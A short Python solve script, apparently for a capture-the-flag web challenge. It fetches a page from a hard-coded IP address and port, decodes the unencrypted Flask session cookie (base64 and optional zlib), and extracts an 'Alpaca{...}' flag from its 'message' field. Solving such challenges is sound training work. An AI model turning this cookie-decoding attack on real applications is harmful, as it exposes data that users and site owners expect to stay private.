import requests
import base64
import zlib
import json
import re

def solve():
    url = "http://34.170.146.252:42993/"
    
    # 1. サーバーにアクセスしてセッションクッキーを取得
    print(f"[*] Accessing {url}...")
    try:
        response = requests.get(url)
        session_cookie = response.cookies.get("session")
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return
    
    if not session_cookie:
        print("[-] Could not find 'session' cookie.")
        return

    print(f"[*] Found session cookie: {session_cookie}")

    # 2. Flask セッションクッキーをデコード
    # 形式: [compressed_marker (optional)].[payload].[timestamp].[signature]
    # 最初が '.' の場合は zlib 圧縮されている
    parts = session_cookie.split('.')
    if session_cookie.startswith('.'):
        # parts[0] は空、parts[1] がペイロード
        payload_b64 = parts[1]
        is_compressed = True
    else:
        payload_b64 = parts[0]
        is_compressed = False

    # Base64 デコード (URL safe, パディング調整)
    payload_b64 += '=' * (-len(payload_b64) % 4)
    decoded_bytes = base64.urlsafe_b64decode(payload_b64)

    if is_compressed:
        try:
            decoded_bytes = zlib.decompress(decoded_bytes)
        except Exception as e:
            print(f"[-] Decompression failed: {e}")

    # JSON としてパース
    try:
        data = json.loads(decoded_bytes)
        print("[+] Decoded session data:")
        print(json.dumps(data, indent=4))
        
        if "message" in data:
            message = data["message"]
            print(f"\n[!] Flag found in message!")
            # メッセージの中からフラグ部分を抽出（Alpaca{...}）
            flag_match = re.search(r"Alpaca\{.*?\}", message)
            if flag_match:
                print(f"FLAG: {flag_match.group(0)}")
            else:
                print("[-] Flag format not found in message.")
        else:
            print("[-] 'message' key not found in session data.")

    except Exception as e:
        print(f"[-] JSON parsing failed: {e}")
        print(f"Raw data: {decoded_bytes}")

if __name__ == "__main__":
    solve()
